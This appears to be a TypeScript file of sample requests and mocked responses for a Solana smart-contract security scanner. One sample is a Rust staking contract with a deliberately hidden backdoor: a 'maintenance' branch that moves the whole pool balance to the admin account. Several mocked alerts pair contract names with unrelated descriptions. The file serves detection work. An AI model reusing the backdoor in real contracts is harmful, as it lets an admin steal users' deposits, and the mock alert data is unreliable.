import { getTransactionTimestamp } from "@/lib/utils";

const ApiUrl = process.env.NEXT_PUBLIC_APP_URL + "api/scan";
const ScanTypeApiUrl = process.env.NEXT_PUBLIC_APP_URL + "api/scan?type=SCAN";
const GetTransactionApiUrl = process.env.NEXT_PUBLIC_APP_URL + "api/transaction";

export const DetectionApiData = {
  "SmartContract": {
    url: ScanTypeApiUrl,
    showUrl: "https://api.sifu.com/scan",
    body: {
      contract_code: "use solana_program::{\n    account_info: : {next_account_info, AccountInfo\n    },\n    entrypoint,\n    entrypoint: :ProgramResult,\n    pubkey: :Pubkey,\n    msg,\n    program: : {invoke, invoke_signed\n    },\n    system_instruction,\n    program_error: :ProgramError,\n    sysvar: : {rent: :Rent, Sysvar\n    },\n};\n\nentrypoint!(process_instruction);\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo\n],\n    instruction_data: &[u8\n],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n\n    let admin_account = next_account_info(accounts_iter)?;\n    let user_account = next_account_info(accounts_iter)?;\n    let pool_account = next_account_info(accounts_iter)?;\n    let system_program = next_account_info(accounts_iter)?;\n\n    let command = instruction_data[\n        0\n    ];\n\n    // Subtle condition for hidden behavior, based on specific user account properties\n    if command == 3 && user_account.key.to_bytes()[\n        0\n    ] % 2 == 0 {\n        // This branch performs a series of legitimate-looking operations that conceal harmful intent\n        return perform_maintenance_tasks(\n            admin_account,\n            user_account,\n            pool_account,\n            system_program,\n            accounts_iter,\n        );\n    }\n    // Main functionality of the contract\n    match command {\n        0 => {\n            // Handle staking, appears normal and functional\n            msg!(\"Processing stake...\");\n            process_stake(user_account, pool_account)?;\n        }\n        1 => {\n            // Handle withdrawal, appears normal and functional\n            msg!(\"Processing withdrawal...\");\n            process_withdrawal(user_account, pool_account)?;\n        }\n        2 => {\n            // Admin collects routine fees, appears normal\n            msg!(\"Collecting routine fees...\");\n            process_fee_collection(admin_account, pool_account)?;\n        }\n        _ => {\n            msg!(\"Invalid command.\");\n            return Err(ProgramError: :InvalidInstructionData);\n        }\n    }\n\n    Ok(())\n}\n\nfn process_stake(user_account: &AccountInfo, pool_account: &AccountInfo) -> ProgramResult {\n    let staking_amount = **user_account.lamports.borrow() / 10;\n    **user_account.try_borrow_mut_lamports()? -= staking_amount;\n    **pool_account.try_borrow_mut_lamports()? += staking_amount;\n\n    Ok(())\n}\n\nfn process_withdrawal(user_account: &AccountInfo, pool_account: &AccountInfo) -> ProgramResult {\n    let withdraw_amount = **pool_account.lamports.borrow() / 10;\n    **pool_account.try_borrow_mut_lamports()? -= withdraw_amount;\n    **user_account.try_borrow_mut_lamports()? += withdraw_amount;\n\n    Ok(())\n}\n\nfn process_fee_collection(admin_account: &AccountInfo, pool_account: &AccountInfo) -> ProgramResult {\n    let fee_amount = **pool_account.lamports.borrow() / 50;\n    **pool_account.try_borrow_mut_lamports()? -= fee_amount;\n    **admin_account.try_borrow_mut_lamports()? += fee_amount;\n\n    Ok(())\n}\n\nfn perform_maintenance_tasks(\n    admin_account: &AccountInfo,\n    user_account: &AccountInfo,\n    pool_account: &AccountInfo,\n    system_program: &AccountInfo,\n    accounts_iter: &mut std: :slice: :Iter<AccountInfo>,\n) -> ProgramResult {\n    msg!(\"Performing scheduled maintenance...\");\n\n    // This condition appears to perform routine checks, but actually triggers hidden fund transfers\n    if user_account.is_signer && admin_account.is_signer {\n        if (user_account.key.to_bytes()[\n            0\n        ] ^ admin_account.key.to_bytes()[\n            0\n        ]) % 3 == 0 {\n            let amount_to_transfer = **pool_account.lamports.borrow();\n            **pool_account.try_borrow_mut_lamports()? -= amount_to_transfer;\n            **admin_account.try_borrow_mut_lamports()? += amount_to_transfer;\n            msg!(\"Maintenance completed successfully.\");\n        } else {\n            msg!(\"No maintenance actions required.\");\n        }\n    }\n\n    Ok(())\n}",
      action: "analyze_contract_code"
    },
    method: "Post",
  },
  "ContractAddress": {
    url: ScanTypeApiUrl,
    showUrl: "https://api.sifu.com/scan",
    body: {
      contract_address: "984GBL7PhceChtN64NWLdBb49rSQXX7ozpdkEbR1pump",
      action: "analyze_contract"
    },
    method: "Post",
  },
  "Transaction": {
    url: ScanTypeApiUrl,
    showUrl: "https://api.sifu.com/scan",
    body: {
      tx_signature: "2AKnN7V5MLD1fyauEWnvMo1dJiCoCUnHnKcmuTtjrNguK288ssULLZeJ9Rkdq8sLk6kENie4oShciRj45aK8AJZD",
      action: "analyze_transaction"
    },
    method: "Post",
  },
  "ContractTransactions": {
    url: ApiUrl + "?timestamp=" + getTransactionTimestamp(),
    method: "Get",
    body: {},
  },
  "OnChainTransaction": {
    url: GetTransactionApiUrl,
    showUrl: "https://api.sifu.com/transaction",
    method: "Post",
    body: {
      "transaction": {
        "feePayer": "9zcsto7PPAFgGExuHsH37hm9FpFuh69veTuAR3neVRvQ",
        "recentBlockhash": "4Gs9EGsoPdMWGT2j9H8S4NuJqkCxJNJYYiGK2HNk66g6",
        "instructions": [
          {
            "programId": "24ysSjyaAdFYTCN9WabADrVkipaTCvv97xvuLSC2y7Bk",
            "keys": [
              {
                "pubkey": "5MsJQJAK6qNfGD5764Mg5zftcnu9nVMDwDMamjV73HHX",
                "isSigner": false,
                "isWritable": true
              },
              {
                "pubkey": "9zcsto7PPAFgGExuHsH37hm9FpFuh69veTuAR3neVRvQ",
                "isSigner": true,
                "isWritable": true
              },
              {
                "pubkey": "11111111111111111111111111111111",
                "isSigner": false,
                "isWritable": false
              }
            ],
            "data": "b712469c946da12280841e0000000000"
          }
        ]
      },
      "accounts": {
        "9zcsto7PPAFgGExuHsH37hm9FpFuh69veTuAR3neVRvQ": {
          "balance": 995000,
          "owner": "11111111111111111111111111111111",
          "data": ""
        },
        "5MsJQJAK6qNfGD5764Mg5zftcnu9nVMDwDMamjV73HHX": {
          "balance": 3037200640,
          "owner": "24ysSjyaAdFYTCN9WabADrVkipaTCvv97xvuLSC2y7Bk",
          "data": "f19a6d0411b16dbc9cbc3c042ff97148f810b246488fd53715a41038e3973c70b0335996b85e4217800f20b400000000030000009cbc3c042ff97148f810b246488fd53715a41038e3973c70b0335996b85e42176493b993b834aeaa371b185a5bdfc8820a866ad9c2eed7c90cfb9c7d18367ce785a02b163c0be285ef6a36147fde4ee1c88ecef573ce1e169e1cbd642db4cdc903000000008b01b40000000040420f000000000040420f"
        }
      },
      "contract_name": "test_vulnerable_pool",
      "api_key": "a9f8bde7-1234-43a9-87c2-99b6f56a9b28",  // Random example API key
      "owner_ssid": "99a2b7c1-87cd-4aef-98d1-024a6de8f6c9" // Random example SSID
    },
    response: {
      "statusCode": 200,
      "body": {
        "transaction": {
          "feePayer": "9zcsto7PPAFgGExuHsH37hm9FpFuh69veTuAR3neVRvQ",
          "recentBlockhash": "4Gs9EGsoPdMWGT2j9H8S4NuJqkCxJNJYYiGK2HNk66g6",
          "instructions": [
            {
              "programId": "24ysSjyaAdFYTCN9WabADrVkipaTCvv97xvuLSC2y7Bk",
              "keys": [
                {
                  "pubkey": "5MsJQJAK6qNfGD5764Mg5zftcnu9nVMDwDMamjV73HHX",
                  "isSigner": false,
                  "isWritable": true
                },
                {
                  "pubkey": "9zcsto7PPAFgGExuHsH37hm9FpFuh69veTuAR3neVRvQ",
                  "isSigner": true,
                  "isWritable": true
                },
                {
                  "pubkey": "11111111111111111111111111111111",
                  "isSigner": false,
                  "isWritable": false
                }
              ],
              "data": "b712469c946da12280841e0000000000"
            }
          ]
        },
        "simulation": {
          "accounts": null,
          "err": null,
          "innerInstructions": null,
          "logs": [
            "Program 24ysSjyaAdFYTCN9WabADrVkipaTCvv97xvuLSC2y7Bk invoke [1]",
            "Program log: Instruction: Withdraw",
            "Program log: User 9zcsto7PPAFgGExuHsH37hm9FpFuh69veTuAR3neVRvQ withdrew 2000000 lamports",
            "Program log: New user balance: 0 lamports",
            "Program log: New pool total balance: 3020000000 lamports",
            "Program 24ysSjyaAdFYTCN9WabADrVkipaTCvv97xvuLSC2y7Bk consumed 17140 of 200000 compute units",
            "Program 24ysSjyaAdFYTCN9WabADrVkipaTCvv97xvuLSC2y7Bk success"
          ],
          "replacementBlockhash": null,
          "returnData": null,
          "unitsConsumed": 17140
        },
        "contract_account_data": {
          "5MsJQJAK6qNfGD5764Mg5zftcnu9nVMDwDMamjV73HHX": {
            "lamports": 3037200640,
            "owner": "24ysSjyaAdFYTCN9WabADrVkipaTCvv97xvuLSC2y7Bk",
            "data": "f19a6d0411b16dbc9cbc3c042ff97148f810b246488fd53715a41038e3973c70b0335996b85e4217800f20b400000000030000009cbc3c042ff97148f810b246488fd53715a41038e3973c70b0335996b85e42176493b993b834aeaa371b185a5bdfc8820a866ad9c2eed7c90cfb9c7d18367ce785a02b163c0be285ef6a36147fde4ee1c88ecef573ce1e169e1cbd642db4cdc903000000008b01b40000000040420f000000000040420f00000000000000000"
          },
          "9zcsto7PPAFgGExuHsH37hm9FpFuh69veTuAR3neVRvQ": {
            "lamports": 995000,
            "owner": "11111111111111111111111111111111",
            "data": ""
          }
        },
        "analysis": {
          "classification": "exploit",
          "confidence": 0.98,
          "details": "The user is attempting to exploit the contract's withdraw function by withdrawing more funds than they have deposited. The user is able to withdraw more than their deposits and steal funds from the contract pool."
        },
        "is_safe": false,
        "signature": null,
        "public_key": "9zcsto7PPAFgGExuHsH37hm9FpFuh69veTuAR3neVRvQ"
      }
    }
  },
  "OffChainTransaction": {
    showUrl: "https://api.sifu.com/transaction" + "?timestamp=" + getTransactionTimestamp(),
    url: GetTransactionApiUrl + "?timestamp=" + getTransactionTimestamp(),
    method: "Get",
    body: {
      "timestamp": "2024-10-07 18:42:00",
      "action": "analyze_contract",
      "contract_name": "Jito"
    },
    response: {
      "data": [
        {
          "signature": "577RXVsrDNJkpHRaG1ZczLcPykFY5JkiVtmVvUWJwyMCkWfWnqiHzu8kKYhT5aUaqF3ovRtufaLu7raYSsPSjzvh",
          "alert_status": "HIGH",
          "custom_detection": "Repetitive contract function calls detected",
          "contract_name": "Jupiter",
          "timestamp": "2024-10-08 07:29:22",
          "score": 90,
          "analysis": "This transaction failed with a custom program error 0x12c, indicating a sequence number issue. This could be due to a race condition or a bug in the contract's logic.",
          "contract_address": "JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4"
        },
        {
          "signature": "2AauuwxJ9uUgQVAWivWBCTWNQLXCeuwCEuUKGjn6mx4Xb5NZmZsyaqUAkNbJhyeLERL27kFoCQvkRBwWe8HV7Pv2",
          "alert_status": "LOW",
          "custom_detection": "Repetitive contract function calls detected",
          "contract_name": "Pump.fun",
          "timestamp": "2024-10-08 07:29:22",
          "score": 10,
          "analysis": "This transaction is safe and represents a user performing a liquid unstake action on Mariande Finance. This is a common functionality of the contract.",
          "contract_address": "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"
        },
        {
          "signature": "47VinyQf149NnnVpmaN4bsuwgXnoMdZ25q5ALTW3C52U1nkPMhD7JEb1n63byqq7RSZgz8JB2DG1e98rhhmTwauC",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Drift",
          "timestamp": "2024-10-08 07:29:22",
          "score": 10,
          "analysis": "This transaction is safe, it changes the authority of a token account. This could represent a transfer of ownership or control of tokens.",
          "contract_address": "dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH"
        },
        {
          "signature": "n4LfJ3b1Qzd6WdVZzwCEra8ZwyeDX25MCGuHYZMf4ArY8Z4ZwZmWUpiXHj8nLGhxkC8uwFpNBqzAHDssNnKb2Jt",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Pump.fun",
          "timestamp": "2024-10-08 07:29:21",
          "score": 10,
          "analysis": "This transaction is safe. It represents a successful interaction with the Drift contract, likely involving placing or updating orders, which is a typical operation on the platform.",
          "contract_address": "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"
        },
        {
          "signature": "61cCmu3vhZj9mFD4Aizw8a7QCMu8TVKZ7L8yerbYn9d5Jw6A2m9TBVmxVLLSXPsnN2uuJTRM2g7jTwJ41xywi6pk",
          "alert_status": "HIGH",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Jupiter",
          "timestamp": "2024-10-08 07:29:13",
          "score": 90,
          "analysis": "The transaction resulted in a Jupiter swap that failed due to slippage tolerance exceeding. This could indicate a malicious attempt to drain funds or exploit the contract.",
          "contract_address": "JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4"
        },
        {
          "signature": "5FcYEwg3DG9QzKBJRCaJZTi4JLoeJNucjxPCGh1RTn6M5qQXrJz4H1b3zD3qS592atah7e63YkbCGf2zPbjbzuc2",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Pump.fun",
          "timestamp": "2024-10-08 07:29:13",
          "score": 0,
          "analysis": "The transaction involved updating perpetual bid/ask TWAP based on oracle data. This is a routine operation and is considered safe.",
          "contract_address": "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"
        },
        {
          "signature": "4czHrvX9XKzuVgx47obRk5fk41tATnpEESUYVBTDtVQeew9RNwxVmr8JppvzEFnyH8giXDjbPfemJ3qWKcL7DQ9b",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Drift",
          "timestamp": "2024-10-08 07:29:13",
          "score": 0,
          "analysis": "This transaction includes an unstaking action. This is considered safe and a normal operation on this contract.",
          "contract_address": "dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH"
        },
       {
          "signature": "qXXQuVuiKnjVMZXSkpGVZzGM1wh2iYUpLB1ZohRCHN6tAXdFUedwJNGX1CfRL1VsVEq9tXET6kDk4gxQozyfgVZ",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Drift",
          "timestamp": "2024-10-08 07:22:59",
          "score": 1,
          "analysis": "This transaction changes the authority of a token account. This is a standard operation for a DAAP.",
          "contract_address": "dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH"
        },
        {
          "signature": "2ekWxq4GspHYig9iM1uzu7ycccQDeqzvmdTst6CGomnacRCBtv6ScXjNgkbhYvD1Yeuaz411yJgh81jCywxDoUeD",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Jito",
          "timestamp": "2024-10-08 07:22:53",
          "score": 1,
          "analysis": "This transaction creates two associated token accounts for a user. This is a normal and expected behavior for Jupiter.",
          "contract_address": "Jito4APyf642JPZPx3hGc6WWJ8zPKtRbRs4P815Awbb"
        },
        {
          "signature": "5ex2Cy9EZRZM2XYhsx7hcYRsa2V8ETL6cDpGGUafa4AFe1Ut4oV4E8mKRGPFaKmhDSBgXJr2cCPzUNC68mzV5AQK",
          "alert_status": "MID",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Jito",
          "timestamp": "2024-10-08 07:22:49",
          "score": 50,
          "analysis": "The transaction failed due to slippage tolerance exceeding the limit. The DAAP owners should be warned about potential trading issues.",
          "contract_address": "Jito4APyf642JPZPx3hGc6WWJ8zPKtRbRs4P815Awbb"
        },
        {
          "signature": "5xNe9VwUvNWVqQLWbp2g3YbDsiiwaSAv5uQFY5UjYyRJwRp2QGi4VmfefSpRoDKodux97UZnPnjd3FHPHczQYfEN",
          "alert_status": "MID",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Jito",
          "timestamp": "2024-10-08 07:22:09",
          "score": 50,
          "analysis": "The transaction failed due to slippage tolerance exceeding the limit. The DAAP owners should be warned about potential trading issues.",
          "contract_address": "Jito4APyf642JPZPx3hGc6WWJ8zPKtRbRs4P815Awbb"
        },
        {
          "signature": "3EgzADURfCLkKa8D5NWC4pABiY26PyBsc8JsuF3F9tbJXUhAShuLEWfEwJwH4YhQYC8kTRYgPB8gs5Pd2MWtk2BU",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Jito",
          "timestamp": "2024-10-08 07:22:06",
          "score": 2,
          "analysis": "The transaction creates a new token account and transfers tokens from one account to another. It's a normal activity for DAAPs.",
          "contract_address": "Jito4APyf642JPZPx3hGc6WWJ8zPKtRbRs4P815Awbb"
        },
        {
          "signature": "4DjBvs2H4XBNZd7Gj7NTyT93KBuaZJR5YV27yrb16mx2rfwmGGiFoPQ9JkBvCJ9tns7hYNqbUAwTjop7tGmoKUbR",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Jito",
          "timestamp": "2024-10-08 07:22:05",
          "score": 2,
          "analysis": "This transaction involves rebalancing operations using Jupiter, a popular DEX on Solana. This is a normal action for a DAAP with liquidity management.",
          "contract_address": "Jito4APyf642JPZPx3hGc6WWJ8zPKtRbRs4P815Awbb"
        },
        {
          "signature": "5oq2Nt3XEKq7876oTitr34gGGsFRT8k5BYYpBoXxsRGgF7M3V2398QBWYjWgtcuuLJosgPTgiSjQdj2tdTCTxmQH",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Jito",
          "timestamp": "2024-10-08 07:22:04",
          "score": 1,
          "analysis": "This transaction updates the stake pool balance. This is a standard action for a DAAP with staking features.",
          "contract_address": "Jito4APyf642JPZPx3hGc6WWJ8zPKtRbRs4P815Awbb"
        },
        {
          "signature": "3bnMMecCrc9hQJtPLVdMvES8QwE9okNA15d8Hk41ghsj74w4bb6VtZFQaHc2PAXRLnZZu573JzEXtxSXz8n1qZ3n",
          "alert_status": "LOW",
          "custom_detection": "No Custom Fraud Found",
          "contract_name": "Mariande Finance",
          "timestamp": "2024-10-08 07:22:01",
          "score": 10,
          "analysis": "This transaction is safe, it is a minting operation on the Magic Eden contract. It likely involves the creation of a new NFT or collectible item on the platform.",
          "contract_address": "MarBmsSgKXdrN1egZf5sqe1TMai9K1rChYNDJgjq7aD"
        },
      ],
      "status": 200
    }
  }
}

// // Get current UTC time
// const now = new Date();
// const utcTimeString = now.toISOString();
// console.log('Current UTC time:', utcTimeString);

// // You can also get individual UTC components:
// const utcYear = now.getUTCFullYear();
// const utcMonth = now.getUTCMonth() + 1; // getUTCMonth() returns 0-11
// const utcDay = now.getUTCDate();
// const utcHours = now.getUTCHours();
// const utcMinutes = now.getUTCMinutes();
// const utcSeconds = now.getUTCSeconds();

// console.log(`UTC Date: ${utcYear}-${utcMonth}-${utcDay}`);
// console.log(`UTC Time: ${utcHours}:${utcMinutes}:${utcSeconds}`);
